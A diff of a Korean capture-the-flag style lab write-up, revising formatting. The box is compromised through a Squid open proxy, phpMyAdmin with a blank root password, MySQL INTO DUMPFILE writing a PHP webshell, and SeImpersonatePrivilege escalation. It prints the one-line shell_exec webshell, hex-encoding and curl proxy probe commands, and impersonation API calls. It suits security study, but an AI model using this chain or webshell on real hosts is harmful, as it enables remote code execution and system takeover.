 | `--proxy http://192.168.248.189:3128` | 모든 요청을 Squid로 흘린다. 이게 없으면 자기 자신을 스캔한다 |
 | `-x php,txt,html,bak` | 확장자 조합. WampServer이므로 `php`는 필수, `bak`은 백업본 노림수 |
 
-타겟형 프로브가 훨씬 효율적이었다 — `/adminer`, `/phpsysinfo`, `/wampthemes`, `/testmysql.php` 전부 적중. **WampServer 홈페이지가 이미 alias 목록(`adminer phpmyadmin phpsysinfo`)을 알려줬기 때문**이다.
+타겟형 프로브가 훨씬 효율적이었다 — `/adminer`, `/phpsysinfo`, `/wampthemes`, `/testmysql.php` 전부 적중. WampServer 홈페이지가 이미 alias 목록(`adminer phpmyadmin phpsysinfo`)을 알려줬기 때문이다.
 
-> [!note] 같은 파일이 대소문자만 바꿔 여러 번 나오면 Windows다
-> `/index.php`·`/Index.php`·`/INDEX.php`가 전부 200 = **대소문자 구분 없는 파일시스템**. OS 판별의 부수 신호다.
-> 역으로, gobuster 결과에 **대소문자 변형이 잔뜩 끼어 있으면 결과 수를 부풀려 읽지 마라.** 실제 엔드포인트는 하나다.
+`/index.php`·`/Index.php`·`/INDEX.php`가 전부 200 = 대소문자 구분 없는 파일시스템 = Windows. OS 판별의 부수 신호다. 역으로, gobuster 결과에 대소문자 변형이 잔뜩 끼어 있으면 결과 수를 부풀려 읽지 마라. 실제 엔드포인트는 하나다.
 
 ---
 
 ## 2. 취약점 분석
 
-> [!abstract] 이 박스에는 CVE가 없다
-> Squid 4.14도, phpMyAdmin 5.0.2도, MySQL 5.7.31도 **익스플로잇 대상이 아니다.** 전부 **오설정(misconfiguration)** 과 **Windows 특권 모델의 기본 동작**을 조합해 뚫린다.
-> 그래서 이 장이 이 노트의 본체다 — 외울 페이로드가 아니라 **이해할 메커니즘**만 남는다.
+이 박스에는 CVE가 없다. Squid 4.14도, phpMyAdmin 5.0.2도, MySQL 5.7.31도 익스플로잇 대상이 아니다. 전부 오설정(misconfiguration)과 Windows 특권 모델의 기본 동작을 조합해 뚫린다. 그래서 이 장이 이 노트의 본체다 — 외울 페이로드가 아니라 이해할 메커니즘만 남는다.
 
 ### 2-1. 배경 지식 ① — 포워드 프록시와 오픈 프록시
 
-**포워드 프록시**는 클라이언트를 대신해 목적지에 접속해주는 중계 서버다. 일반 HTTP 요청과 프록시 요청은 **요청 라인 자체가 다르다**:
+포워드 프록시는 클라이언트를 대신해 목적지에 접속해주는 중계 서버다. 일반 HTTP 요청과 프록시 요청은 요청 라인 자체가 다르다:
 
 ```
 일반 요청:   GET /path HTTP/1.1
@@ -340,14 +313,11 @@ wamp 기본값은 **`root` / 빈 패스워드**다. 이 한 줄이 phpMyAdmin �
              Host: example.com
 ```
 
-프록시는 절대 URI를 보고 **자기가 그 목적지에 새로 TCP 연결을 연다.** 이 순간 **출발지 IP가 프록시의 IP로 바뀐다.**
+프록시는 절대 URI를 보고 자기가 그 목적지에 새로 TCP 연결을 연다. 이 순간 출발지 IP가 프록시의 IP로 바뀐다.
 
-> [!danger] 이게 왜 방화벽을 무력화하는가
-> 방화벽 규칙은 보통 **"외부 → 내부 3306 차단"** 이다. 그런데 프록시가 여는 연결은 **내부 → 내부(127.0.0.1 → 127.0.0.1)** 다.
-> 방화벽이 볼 때 이건 로컬 트래픽이라 규칙이 적용되지 않는다. **프록시가 방화벽의 안쪽에 서서 문을 열어주는 구조**다.
-> 그래서 오픈 프록시 하나면 "외부 노출 포트 1개"가 "내부 전 포트 접근"으로 뒤집힌다.
+방화벽 규칙은 보통 "외부 → 내부 3306 차단"이다. 그런데 프록시가 여는 연결은 내부 → 내부(127.0.0.1 → 127.0.0.1)다. 방화벽이 볼 때 이건 로컬 트래픽이라 규칙이 적용되지 않는다. 프록시가 방화벽의 안쪽에 서서 문을 열어주는 구조다. 그래서 오픈 프록시 하나면 "외부 노출 포트 1개"가 "내부 전 포트 접근"으로 뒤집힌다.
 
-**오픈 프록시**란 인증 없이, 출발지 제한 없이 아무나 쓸 수 있는 포워드 프록시다. Squid의 접근 제어는 `squid.conf`의 `http_access` 지시자로 이뤄지는데, 다음처럼 되면 오픈 프록시다:
+오픈 프록시란 인증 없이, 출발지 제한 없이 아무나 쓸 수 있는 포워드 프록시다. Squid의 접근 제어는 `squid.conf`의 `http_access` 지시자로 이뤄지는데, 다음처럼 되면 오픈 프록시다:
 
 ```
 http_access allow all           ← 이 한 줄이 원인
@@ -357,37 +327,33 @@ http_access allow all           ← 이 한 줄이 원인
 # http_access deny all
 ```
 
-> [!note] `http_access allow all`은 **관측이 아니라 추론**이다 [가정]
-> cache manager(`/squid-internal-mgr/info`)가 403이라 **설정을 덤프하지 못했다**. 인증·출발지 제한 없이 중계된다는 관측에서 `allow all` 상당의 구성으로 **추정**할 뿐, 실제로는 넓은 `localnet` 대역이거나 src ACL 부재일 수도 있다. 어느 쪽이든 §8의 조치(출발지 제한 + `deny all`)는 유효하다.
+`http_access allow all`은 관측이 아니라 추론이다 [가정]. cache manager(`/squid-internal-mgr/info`)가 403이라 설정을 덤프하지 못했다. 인증·출발지 제한 없이 중계된다는 관측에서 `allow all` 상당의 구성으로 추정할 뿐, 실제로는 넓은 `localnet` 대역이거나 src ACL 부재일 수도 있다. 어느 쪽이든 §8의 조치(출발지 제한 + `deny all`)는 유효하다.
 
-Squid에는 그 외에 두 개의 안전장치가 더 있고, **이 박스에서는 그것들만 살아 있었다**:
+Squid에는 그 외에 두 개의 안전장치가 더 있고, 이 박스에서는 그것들만 살아 있었다:
 
 | ACL | 기본 동작 | 이 박스에서 관측된 결과 |
 |---|---|---|
-| `Safe_ports` | 21,70,80,210,280,443,488,591,777 및 **1025-65535**만 허용 | 1024 이하 포트(예: 445, 135)는 **403 ERR_ACCESS_DENIED** → 개폐 판별 불가 |
-| `SSL_ports` | 443만 허용(`deny CONNECT !SSL_ports`) | 443 외 `CONNECT` 차단(443엔 서비스 없음) → **TLS 터널링·임의 TCP 터널 불가** |
+| `Safe_ports` | 21,70,80,210,280,443,488,591,777 및 1025-65535만 허용 | 1024 이하 포트(예: 445, 135)는 403 ERR_ACCESS_DENIED → 개폐 판별 불가 |
+| `SSL_ports` | 443만 허용(`deny CONNECT !SSL_ports`) | 443 외 `CONNECT` 차단(443엔 서비스 없음) → TLS 터널링·임의 TCP 터널 불가 |
 | cache manager | `localhost`만 허용 | `/squid-internal-mgr/info` 403 → 설정 덤프 불가 |
 
-> [!warning] `CONNECT`가 막혔다는 것의 실질적 의미
-> `CONNECT`가 열려 있었다면 Squid는 **범용 TCP 터널**이 된다 — `proxychains`로 nmap을 통째로 밀어 넣고, `evil-winrm`을 5985에 직접 붙이고, MySQL 클라이언트로 3306에 붙을 수 있었다.
-> 막혀 있으니 **평문 HTTP GET만 통과**한다. 그래서 이 박스의 모든 공격이 **"HTTP로 표현 가능한 것"** 으로 제한된다 — 이게 phpMyAdmin(HTTP)을 경유해 MySQL을 때린 이유이고, WinRM(5985가 열려 있는데도)을 못 쓴 이유다.
-> 정확히 말하면 `CONNECT`가 443으로는 ACL상 허용되지만 443에 서비스가 없어 무용이고, **1025-65535 고포트는 `Safe_ports`라 평문 GET 프록시는 되지만 `SSL_ports`가 아니라 `CONNECT`는 거부**된다. (`acl CONNECT method CONNECT`는 Squid 4에선 설정 파일 줄이고, 빌트인이 된 것은 Squid 5부터다.)
-> **프록시를 만나면 `CONNECT` 가능 여부를 먼저 확인하라.** 되면 게임이 훨씬 쉬워진다:
-> ```bash
-> curl -v -x http://TARGET:3128 https://example.com/          # CONNECT 시도
-> ```
+`CONNECT`가 열려 있었다면 Squid는 범용 TCP 터널이 된다 — `proxychains`로 nmap을 통째로 밀어 넣고, `evil-winrm`을 5985에 직접 붙이고, MySQL 클라이언트로 3306에 붙을 수 있었다. 막혀 있으니 평문 HTTP GET만 통과한다. 그래서 이 박스의 모든 공격이 "HTTP로 표현 가능한 것"으로 제한된다 — 이게 phpMyAdmin(HTTP)을 경유해 MySQL을 때린 이유이고, WinRM(5985가 열려 있는데도)을 못 쓴 이유다. 정확히 말하면 `CONNECT`가 443으로는 ACL상 허용되지만 443에 서비스가 없어 무용이고, 1025-65535 고포트는 `Safe_ports`라 평문 GET 프록시는 되지만 `SSL_ports`가 아니라 `CONNECT`는 거부된다(`acl CONNECT method CONNECT`는 Squid 4에선 설정 파일 줄이고, 빌트인이 된 것은 Squid 5부터다). 프록시를 만나면 `CONNECT` 가능 여부를 먼저 확인하라. 되면 게임이 훨씬 쉬워진다:
+
+```bash
+curl -v -x http://TARGET:3128 https://example.com/          # CONNECT 시도
+```
 
 ### 2-2. 왜 응답 코드로 포트 개폐를 알 수 있는가
 
-판별 기준은 **Squid가 어느 단계에서 실패했는가**를 읽는 것이다:
+판별 기준은 Squid가 어느 단계에서 실패했는가를 읽는 것이다:
 
 | 단계 | 프록시 동작 | 실패 시 응답 |
 |---|---|---|
-| ① ACL 검사 | 요청 포트가 `Safe_ports`인가 | **403 ERR_ACCESS_DENIED** |
-| ② TCP 연결 | `connect(127.0.0.1, port)` | **503 ERR_CONNECT_FAIL** (connect 실패 — RST/타임아웃 **구분 없이** 같은 에러) |
+| ① ACL 검사 | 요청 포트가 `Safe_ports`인가 | 403 ERR_ACCESS_DENIED |
+| ② TCP 연결 | `connect(127.0.0.1, port)` | 503 ERR_CONNECT_FAIL (connect 실패 — RST/타임아웃 구분 없이 같은 에러) |
 | ③ HTTP 파싱 | 응답을 HTTP로 해석 | 실패해도 HTTP/0.9로 통과시킴 |
 
-즉 **① 을 통과하고 ② 에서 실패하면 503, ② 를 통과하면 무엇이든 그대로 돌아온다.**
+즉 ①을 통과하고 ②에서 실패하면 503, ②를 통과하면 무엇이든 그대로 돌아온다.
 
 ```
 503 → 연결 실패        (닫힘 또는 필터링 — 본문 `The system returned:` 줄로 구분)
@@ -395,71 +361,62 @@ Squid에는 그 외에 두 개의 안전장치가 더 있고, **이 박스에서
 그 외 → 포트 열림      (연결 성공 = 뭐라도 응답했다)
 ```
 
-> [!danger] 이 기준을 손으로 이해하고 있어야 하는 이유
-> 자동화 도구는 **"403을 닫힘으로 집계"** 하거나 **"타임아웃을 닫힘으로 집계"** 하는 실수를 흔히 한다.
-> - 403은 **닫힘이 아니라 모름**이다. 여기에 서비스가 있을 수도 있다
-> - 타임아웃은 **필터링**이지 닫힘이 아니다
->
-> 도구 결과를 그대로 보고서에 쓰면 "스캔 결과 445는 닫혀 있었다"는 **틀린 문장**이 된다. 실제로는 445가 외부에 열려 있다(nmap이 봤다).
-> **응답 헤더 `X-Squid-Error`를 직접 확인하는 습관**을 들여라:
-> ```bash
-> curl -s -D - -o /dev/null -x http://192.168.248.189:3128 http://127.0.0.1:9999/ | grep -i squid-error
-> ```
+자동화 도구는 403을 닫힘으로 집계하거나 타임아웃을 닫힘으로 집계하는 실수를 흔히 한다. 403은 닫힘이 아니라 **모름**이다 — 여기에 서비스가 있을 수도 있다. 타임아웃은 **필터링**이지 닫힘이 아니다. 도구 결과를 그대로 보고서에 쓰면 "스캔 결과 445는 닫혀 있었다"는 틀린 문장이 된다. 실제로는 445가 외부에 열려 있다(nmap이 봤다). 응답 헤더 `X-Squid-Error`를 직접 확인하는 습관을 들여라:
 
-> [!note] 503을 "닫힘"으로 단정하지 마라 — 실제 판별자 셋
-> Squid는 connect() 실패를 원인별로 구분하지 않는다. refused(RST)든 timeout(필터링)이든 **동일하게 `ERR_CONNECT_FAIL`** 이고 대개 동일하게 503이다(`src/err_type.h`에 `ERR_CONNECT_REFUSED`/`ERR_CONNECT_TIMEOUT` 자체가 없다 — `ConnOpener`의 타임아웃도 같은 분기로 떨어진다). 그래서 503만으로는 닫힘과 필터링을 못 가른다. 실제 판별은 셋으로 한다:
-> 1. **본문 `The system returned:` 줄** — `(111) Connection refused`(닫힘) vs `(110) Connection timed out`(필터링). Squid가 xerrno를 노출하는 유일한 지점이다
-> 2. **응답 지연** — refused는 즉시, 필터링은 `connect_timeout`(기본 1분) 대기. 주소가 여럿이면 `forward_max_tries`(기본 25)만큼 더 걸린다
-> 3. **`ERR_READ_TIMEOUT`이 뜨면 핸드셰이크는 성공한 것 = 포트 열림.** 스캔에서는 오히려 강한 양성 신호다
->
-> 상태 코드도 항상 503은 아니다 — 보통 503이지만 검증 필요 시/connect 타이머(`FwdState.cc`)면 **504**, CONNECT 터널(`tunnel.cc`)은 503, 피어 응답 불량은 **502**로 갈린다.
-> **이 박스처럼 루프백(`127.0.0.1`) 대상에서는 필터링이 끼어들 여지가 없어 `503=닫힘`이 실질적으로 성립**한다. 그래서 위 요약표의 단정이 이 박스에서는 통했다 — 하지만 외부 IP 대상 스캔에 그대로 옮기면 틀린다.
+```bash
+curl -s -D - -o /dev/null -x http://192.168.248.189:3128 http://127.0.0.1:9999/ | grep -i squid-error
+```
+
+> [!note] 503을 "닫힘"으로 단정하지 마라 — 실제 판별자는 셋이다
+> Squid는 connect() 실패를 원인별로 구분하지 않는다. refused(RST)든 timeout(필터링)이든 동일하게 `ERR_CONNECT_FAIL`이고 대개 동일하게 503이다(`src/err_type.h`에 `ERR_CONNECT_REFUSED`/`ERR_CONNECT_TIMEOUT` 자체가 없다 — `ConnOpener`의 타임아웃도 같은 분기로 떨어진다). 그래서 503만으로는 닫힘과 필터링을 못 가른다. 실제 판별은 셋으로 한다:
+> 1. 본문 `The system returned:` 줄 — `(111) Connection refused`(닫힘) vs `(110) Connection timed out`(필터링). Squid가 xerrno를 노출하는 유일한 지점이다
+> 2. 응답 지연 — refused는 즉시, 필터링은 `connect_timeout`(기본 1분) 대기. 주소가 여럿이면 `forward_max_tries`(기본 25)만큼 더 걸린다
+> 3. `ERR_READ_TIMEOUT`이 뜨면 핸드셰이크는 성공한 것 = 포트 열림. 스캔에서는 오히려 강한 양성 신호다
+
+상태 코드도 항상 503은 아니다 — 보통 503이지만 검증 필요 시/connect 타이머(`FwdState.cc`)면 504, CONNECT 터널(`tunnel.cc`)은 503, 피어 응답 불량은 502로 갈린다. 이 박스처럼 루프백(`127.0.0.1`) 대상에서는 필터링이 끼어들 여지가 없어 `503=닫힘`이 실질적으로 성립한다. 그래서 위 요약표의 단정이 이 박스에서는 통했다 — 하지만 외부 IP 대상 스캔에 그대로 옮기면 틀린다.
 
 ### 2-3. 배경 지식 ② — MySQL 파일 쓰기 원시(primitive)
 
-DB 접근이 곧 RCE가 되는 것은 아니다. **DB에서 파일 쓰기로, 파일 쓰기에서 코드 실행으로** 두 번 승격해야 한다.
+DB 접근이 곧 RCE가 되는 것은 아니다. DB에서 파일 쓰기로, 파일 쓰기에서 코드 실행으로 두 번 승격해야 한다.
 
-MySQL에서 파일을 쓰려면 **세 조건**이 전부 성립해야 한다:
+MySQL에서 파일을 쓰려면 세 조건이 전부 성립해야 한다:
 
 | 조건 | 확인 방법 | 이 박스 |
 |---|---|---|
 | DB 계정에 `FILE` 권한 | `SHOW GRANTS;` 또는 실제 시도 | `root`이므로 있음 |
-| `@@secure_file_priv`가 쓰기를 허용 | `SELECT @@secure_file_priv;` | **빈 문자열 = 무제한** |
-| 대상 디렉터리에 **mysqld 프로세스 계정**의 쓰기 권한 | 실제 시도 | `C:\wamp\www\` 쓰기 성공 |
+| `@@secure_file_priv`가 쓰기를 허용 | `SELECT @@secure_file_priv;` | 빈 문자열 = 무제한 |
+| 대상 디렉터리에 mysqld 프로세스 계정의 쓰기 권한 | 실제 시도 | `C:\wamp\www\` 쓰기 성공 |
 
-그리고 **파일 쓰기 → 코드 실행**을 잇는 것은 별개 조건이다:
+그리고 파일 쓰기 → 코드 실행을 잇는 것은 별개 조건이다:
 
 | 조건 | 이 박스 |
 |---|---|
-| 쓴 파일이 **웹서버가 서빙하는 경로** 안에 있어야 함 | `C:\wamp\www\` = 8080의 DocumentRoot |
-| 그 파일이 **인터프리터로 실행**되어야 함 | `.php` 확장자 + Apache의 PHP 핸들러 |
-| 그 경로에 **우리가 접근 가능**해야 함 | 프록시 경유로 `http://127.0.0.1:8080/sh.php` |
+| 쓴 파일이 웹서버가 서빙하는 경로 안에 있어야 함 | `C:\wamp\www\` = 8080의 DocumentRoot |
+| 그 파일이 인터프리터로 실행되어야 함 | `.php` 확장자 + Apache의 PHP 핸들러 |
+| 그 경로에 우리가 접근 가능해야 함 | 프록시 경유로 `http://127.0.0.1:8080/sh.php` |
 
-> [!note] `@@secure_file_priv` 세 가지 값의 의미
-> | 값 | 의미 |
-> |---|---|
-> | `NULL` | **파일 입출력 전면 차단.** `INTO OUTFILE`·`INTO DUMPFILE`·`LOAD_FILE()` 전부 죽는다 |
-> | `/some/dir/` | **그 디렉터리 안에서만** 읽기/쓰기 가능. 웹루트가 아니면 RCE로 못 잇는다 |
-> | **빈 문자열** | **제한 없음.** 아무 경로나 쓸 수 있다 ← 이 박스 |
->
-> MySQL 5.7부터 기본값이 강화되어 **보통 특정 디렉터리(예: `mysql-files`)로 설정**된다(실제 기본값은 플랫폼·설치 방식/`INSTALL_LAYOUT`에 따라 결정된다). 빈 문자열(=무제한)은 **WampServer/XAMPP 같은 올인원 패키지에서 흔한 이완 구성**이다.
-> 단, [[Hawat]]에서는 **`NULL`인데도 쓰기가 됐다.** 변수값은 참고이고 **실측(마커 파일 쓰기)이 최종 근거**다.
+`@@secure_file_priv` 세 값의 의미:
+
+| 값 | 의미 |
+|---|---|
+| `NULL` | 파일 입출력 전면 차단. `INTO OUTFILE`·`INTO DUMPFILE`·`LOAD_FILE()` 전부 죽는다 |
+| `/some/dir/` | 그 디렉터리 안에서만 읽기/쓰기 가능. 웹루트가 아니면 RCE로 못 잇는다 |
+| **빈 문자열** | **제한 없음.** 아무 경로나 쓸 수 있다 ← 이 박스 |
+
+MySQL 5.7부터 기본값이 강화되어 보통 특정 디렉터리(예: `mysql-files`)로 설정된다(실제 기본값은 플랫폼·설치 방식/`INSTALL_LAYOUT`에 따라 결정된다). 빈 문자열(=무제한)은 WampServer/XAMPP 같은 올인원 패키지에서 흔한 이완 구성이다. 단, [[Hawat]]에서는 `NULL`인데도 쓰기가 됐다. 변수값은 참고이고 실측(마커 파일 쓰기)이 최종 근거다.
 
 ### 2-4. 왜 취약한가 — 오설정 4중 중첩
 
-이 박스는 단일 결함이 아니라 **네 개의 오설정이 사슬로 연결**돼 뚫린다. 하나만 고쳤어도 체인이 끊긴다:
+이 박스는 단일 결함이 아니라 네 개의 오설정이 사슬로 연결돼 뚫린다. 하나만 고쳤어도 체인이 끊긴다:
 
 | # | 오설정 | 없었다면 |
 |---|---|---|
 | 1 | Squid `http_access allow all` | 내부 포트에 아예 도달 불가 → 박스 종료 |
-| 2 | MySQL `root` **빈 패스워드** | phpMyAdmin 로그인 실패 |
-| 3 | `@@secure_file_priv` **빈 문자열** | 파일 쓰기 차단 |
-| 4 | mysqld가 **웹루트에 쓰기 가능** | 웹셸을 서빙 경로에 못 놓음 |
+| 2 | MySQL `root` 빈 패스워드 | phpMyAdmin 로그인 실패 |
+| 3 | `@@secure_file_priv` 빈 문자열 | 파일 쓰기 차단 |
+| 4 | mysqld가 웹루트에 쓰기 가능 | 웹셸을 서빙 경로에 못 놓음 |
 
-> [!tip] 체인으로 보는 습관
-> "취약점 하나 찾기"가 아니라 **"내가 가진 원시(primitive)를 무엇으로 승격할 수 있는가"** 로 사고한다.
-> 여기서는 `HTTP 중계` → `DB 인증` → `임의 파일 쓰기` → `코드 실행` → `토큰 특권 복원` → `SYSTEM` 으로 **여섯 번 승격**했다.
-> 각 단계에서 "지금 내가 가진 능력이 정확히 무엇인가"를 한 문장으로 말할 수 있어야 다음 수가 보인다.
+"취약점 하나 찾기"가 아니라 "내가 가진 원시(primitive)를 무엇으로 승격할 수 있는가"로 사고한다. 여기서는 HTTP 중계 → DB 인증 → 임의 파일 쓰기 → 코드 실행 → 토큰 특권 복원 → SYSTEM으로 여섯 번 승격했다. 각 단계에서 "지금 내가 가진 능력이 정확히 무엇인가"를 한 문장으로 말할 수 있어야 다음 수가 보인다.
 
 ### 2-5. 왜 이 페이로드인가 — hex 리터럴과 `DUMPFILE`
 
@@ -469,13 +426,13 @@ MySQL에서 파일을 쓰려면 **세 조건**이 전부 성립해야 한다:
 <?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
 ```
 
-이걸 그대로 SQL 문자열에 넣으면 **인용 계층이 3중으로 중첩**된다:
+이걸 그대로 SQL 문자열에 넣으면 인용 계층이 3중으로 중첩된다:
 
 ```
 파이썬 문자열  →  HTTP POST 본문(urlencode)  →  PHP(phpMyAdmin)  →  MySQL 파서
 ```
 
-원문에 `"`·`'`·`$`·`<`·`>`가 전부 들어 있어 어느 계층에서든 깨진다. **MySQL은 `0x...` 형태의 hex 문자열 리터럴을 그대로 받아주므로 인용 문제가 통째로 사라진다.**
+원문에 `"`·`'`·`$`·`<`·`>`가 전부 들어 있어 어느 계층에서든 깨진다. MySQL은 `0x...` 형태의 hex 문자열 리터럴을 그대로 받아주므로 인용 문제가 통째로 사라진다.
 
 ```bash
 echo -n '<?php echo "PWN:"; ... ?>' | xxd -p | tr -d '\n'
@@ -485,51 +442,48 @@ echo -n '<?php echo "PWN:"; ... ?>' | xxd -p | tr -d '\n'
 
 | 조각 | 역할 |
 |---|---|
-| `SELECT 0x3c3f7068...` | hex 리터럴 = 웹셸 바이트열 그대로. `[a-f0-9]`만 남으므로 **모든 인용 계층을 무사통과** |
+| `SELECT 0x3c3f7068...` | hex 리터럴 = 웹셸 바이트열 그대로. `[a-f0-9]`만 남으므로 모든 인용 계층을 무사통과 |
 | `...0a` (끝) | 개행(`\n`). 파일 끝을 정리한다 |
-| `INTO DUMPFILE` | 단일 행을 **가공 없이** 파일로 기록 |
-| `'C:/wamp/www/sh.php'` | **슬래시** 경로. 백슬래시는 SQL 문자열 이스케이프(`\w`)와 충돌한다 |
+| `INTO DUMPFILE` | 단일 행을 가공 없이 파일로 기록 |
+| `'C:/wamp/www/sh.php'` | 슬래시 경로. 백슬래시는 SQL 문자열 이스케이프(`\w`)와 충돌한다 |
 
-> [!danger] `INTO OUTFILE` vs `INTO DUMPFILE` — 이 구분은 필수다
-> | | `INTO OUTFILE` | `INTO DUMPFILE` |
-> |---|---|---|
-> | 대상 | 여러 행 | **단일 행만** |
-> | 가공 | 열 구분자(`\t`)·행 구분자(`\n`) 삽입, 특수문자 이스케이프(`\\`, `\0`) | **없음. 바이트 그대로** |
-> | 용도 | 텍스트 덤프 | **바이너리·정확한 바이트열** |
->
-> `OUTFILE`로 웹셸을 쓰면 백슬래시가 `\\`로 부풀고 개행이 끼어들어 **PHP 문법이 깨질 수 있다.** 특히 `.exe`·`.dll` 같은 바이너리는 100% 망가진다.
-> [[Hawat]]에서는 `UNION ... INTO OUTFILE`을 썼는데 **앞에 원 쿼리 결과가 붙었다** — PHP는 태그 밖을 텍스트로 뱉을 뿐이라 우연히 동작했다. **의도적으로 하려면 `DUMPFILE`이 맞다.**
+`INTO OUTFILE` vs `INTO DUMPFILE` — 이 구분은 필수다:
 
-> [!warning] 두 구문 모두 **기존 파일을 덮어쓰지 않는다**
-> 대상 파일이 이미 존재하면 `Errcode: 17 - File exists`로 실패한다. 같은 이름으로 재시도하며 헤매지 말고 **파일명을 바꿔라.**
-> 이것 때문에 "권한 문제"로 오진하고 시간을 태우는 경우가 많다.
+| | `INTO OUTFILE` | `INTO DUMPFILE` |
+|---|---|---|
+| 대상 | 여러 행 | 단일 행만 |
+| 가공 | 열 구분자(`\t`)·행 구분자(`\n`) 삽입, 특수문자 이스케이프(`\\`, `\0`) | 없음. 바이트 그대로 |
+| 용도 | 텍스트 덤프 | 바이너리·정확한 바이트열 |
+
+`OUTFILE`로 웹셸을 쓰면 백슬래시가 `\\`로 부풀고 개행이 끼어들어 PHP 문법이 깨질 수 있다. 특히 `.exe`·`.dll` 같은 바이너리는 100% 망가진다. [[Hawat]]에서는 `UNION ... INTO OUTFILE`을 썼는데 앞에 원 쿼리 결과가 붙었다 — PHP는 태그 밖을 텍스트로 뱉을 뿐이라 우연히 동작했다. 의도적으로 하려면 `DUMPFILE`이 맞다.
+
+두 구문 모두 **기존 파일을 덮어쓰지 않는다.** 대상 파일이 이미 존재하면 `Errcode: 17 - File exists`로 실패한다. 같은 이름으로 재시도하며 헤매지 말고 파일명을 바꿔라. 이것 때문에 "권한 문제"로 오진하고 시간을 태우는 경우가 많다.
 
 ### 2-6. 배경 지식 ③ — Windows 접근 토큰과 특권 모델
 
-여기서부터가 **Linux 반사신경이 통하지 않는 구간**이다. 개념부터 세운다.
+여기서부터가 Linux 반사신경이 통하지 않는 구간이다. 개념부터 세운다.
 
-**접근 토큰(access token)** 은 프로세스가 들고 다니는 신분증이다. 안에 들어 있는 것:
+접근 토큰(access token)은 프로세스가 들고 다니는 신분증이다. 안에 들어 있는 것:
 
 | 구성 요소 | 리눅스 대응 | 설명 |
 |---|---|---|
 | 사용자 SID | uid | `NT AUTHORITY\LOCAL SERVICE` 등 |
 | 그룹 SID 목록 | gid/groups | `BUILTIN\Users`, `NT AUTHORITY\SERVICE` … |
-| **특권(privileges) 목록** | **대응 없음** | 각 항목이 **Enabled/Disabled** 상태를 가짐 |
+| 특권(privileges) 목록 | 대응 없음 | 각 항목이 Enabled/Disabled 상태를 가짐 |
 | 무결성 수준 | 대응 없음 | Low / Medium / High / System |
 
-> [!note] 리눅스에 없는 개념 — "특권"은 uid와 독립이다
-> 리눅스는 "root냐 아니냐"가 거의 전부다(capabilities가 있지만 예외적). Windows는 **비관리자 계정이 관리자급 특권을 하나만 들고 있을 수 있다.**
-> 그래서 Windows 권한상승의 첫 질문은 **"내가 누구냐"가 아니라 "내 토큰에 무엇이 켜져 있느냐"** 다.
-> ```
-> whoami /priv          ← Windows 셸을 잡으면 이게 1번 명령이다
-> whoami /all           ← 그룹 SID까지
-> ```
+리눅스는 "root냐 아니냐"가 거의 전부다(capabilities가 있지만 예외적). Windows는 비관리자 계정이 관리자급 특권을 하나만 들고 있을 수 있다. 그래서 Windows 권한상승의 첫 질문은 "내가 누구냐"가 아니라 **"내 토큰에 무엇이 켜져 있느냐"**다.
 
-**SYSTEM으로 가는 열쇠가 되는 특권들** (전부 사실상 관리자 동급):
+```
+whoami /priv          ← Windows 셸을 잡으면 이게 1번 명령이다
+whoami /all           ← 그룹 SID까지
+```
+
+SYSTEM으로 가는 열쇠가 되는 특권들 (전부 사실상 관리자 동급):
 
 | 특권 | 무엇을 할 수 있는가 |
 |---|---|
-| **`SeImpersonatePrivilege`** | **다른 클라이언트의 토큰을 흉내낼 수 있다** ← 이 박스 |
+| **`SeImpersonatePrivilege`** | 다른 클라이언트의 토큰을 흉내낼 수 있다 ← 이 박스 |
 | `SeAssignPrimaryTokenPrivilege` | 임의 토큰으로 프로세스를 새로 만들 수 있다 |
 | `SeDebugPrivilege` | 임의 프로세스 메모리 접근 → SYSTEM 프로세스에서 토큰 훔치기 |
 | `SeBackupPrivilege` | 임의 파일 읽기 → SAM/SYSTEM 하이브 덤프 |
@@ -541,9 +495,9 @@ echo -n '<?php echo "PWN:"; ... ?>' | xxd -p | tr -d '\n'
 
 `SeImpersonatePrivilege`의 정상 용도부터 이해해야 악용이 보인다.
 
-**정상 용도**: 서버 프로세스(IIS, SQL Server, 파일 서버)는 클라이언트를 대신해 리소스에 접근해야 한다. 예를 들어 웹서버가 "이 사용자가 이 파일을 읽을 권한이 있는가"를 판정하려면 **잠시 그 사용자인 척**해야 한다. 그래서 서비스 계정에는 이 특권이 기본 부여된다.
+정상 용도: 서버 프로세스(IIS, SQL Server, 파일 서버)는 클라이언트를 대신해 리소스에 접근해야 한다. 예를 들어 웹서버가 "이 사용자가 이 파일을 읽을 권한이 있는가"를 판정하려면 잠시 그 사용자인 척해야 한다. 그래서 서비스 계정에는 이 특권이 기본 부여된다.
 
-**악용 원리** — 세 단계다:
+악용 원리 — 세 단계다:
 
 ```
 ① 우리가 통제하는 "서버 엔드포인트"를 만든다        (명명 파이프 / COM 리스너)
@@ -561,44 +515,38 @@ OpenThreadToken(...) / DuplicateTokenEx(...)   // 임퍼소네이션 토큰 → 
 CreateProcessAsUser(hToken, ...)               // SYSTEM으로 프로세스 생성
 ```
 
-> [!danger] `ImpersonateNamedPipeClient()`가 전부다
-> 이 함수가 **권한상승에 쓸 수 있는 수준의 임퍼소네이션**을 하려면 `SeImpersonatePrivilege`가 필요하다. 특권이 없으면 무조건 실패가 아니라 **Identify 수준으로 강등**되어 클라이언트 신원 확인만 가능하고, 그 토큰으로는 프로세스를 만들 수 없다. (MS 문서는 4개 조건 중 하나만 만족해도 임퍼소네이션을 허용한다 — 요청 수준이 Identification/Anonymous, 호출자가 SeImpersonate 보유, 명시적 자격증명으로 만든 토큰, 또는 인증된 신원이 호출자와 동일.)
-> 그래서 **Potato 계열은 전부 "SeImpersonate 보유"를 전제**로 한다. 특권 없이 PrintSpoofer를 던지면 아무 일도 안 일어난다.
-> 이 박스가 노리는 지점이 정확히 여기다 — 처음에 셸을 잡으면 **특권이 3개뿐**이라 PrintSpoofer가 안 먹는다.
